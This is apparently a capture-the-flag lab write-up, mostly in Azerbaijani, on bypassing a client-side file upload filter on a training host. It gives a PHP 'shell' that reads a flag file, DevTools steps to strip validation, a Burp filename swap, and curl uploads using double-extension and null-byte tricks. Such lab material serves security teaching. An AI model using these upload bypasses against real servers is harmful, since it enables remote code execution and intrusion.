# Client-Side Upload Filter Bypass - Task 1

## Target
- URL: http://test-s3.web0x05.hbtn/task1
- Subdomain: test-s3.web0x05.hbtn

## Method 1: Browser DevTools (Ən asan)

1. **PHP faylı hazırla**: shell.php
   ```php
   <?php readfile('FLAG_1.txt') ?>
   ```

2. **Brauzerdə aç**: http://test-s3.web0x05.hbtn/task1

3. **DevTools aç** (F12)

4. **İki üsul**:
   
   **A) JavaScript-i söndür:**
   - Console-a get: `document.querySelector('input[type="file"]').removeAttribute('accept')`
   - Və ya validation funksiyasını tap və sil
   
   **B) Event listener-i sil:**
   - Elements tab-da file input-u tap
   - Event Listeners-də validation-u sil

5. **Upload et**: shell.php faylını seç və göndər

6. **Access et**: Upload olunan faylın URL-inə get və FLAG-ı götür

## Method 2: Burp Suite (Professional)

1. Burp Suite aç və proxy qur

2. Faylı `.jpg` və ya `.png` kimi rename et: `shell.jpg`

3. Upload et və Burp Suite request-i intercept etsin

4. Request-də dəyişdir:
   ```
   Content-Disposition: form-data; name="file"; filename="shell.jpg"
   ↓
   Content-Disposition: form-data; name="file"; filename="shell.php"
   ```

5. Forward et və response-da upload path-i tap

6. Upload olunan fayla get və FLAG-ı götür

## Method 3: cURL (əl ilə)

```bash
# Double extension trik
curl -X POST http://test-s3.web0x05.hbtn/task1 \
  -F "file=@shell.php.jpg" \
  -H "Content-Type: multipart/form-data"

# Və ya null byte (əgər server PHP < 5.3.4)
curl -X POST http://test-s3.web0x05.hbtn/task1 \
  -F "file=@shell.php%00.jpg"
```

## Qeyd
- Client-side filter yalnız browser-də işləyir
- Server-side validation yoxdursa, istənilən file type upload ola bilər
- FLAG yalnız PHP file execute olunanda generate olur
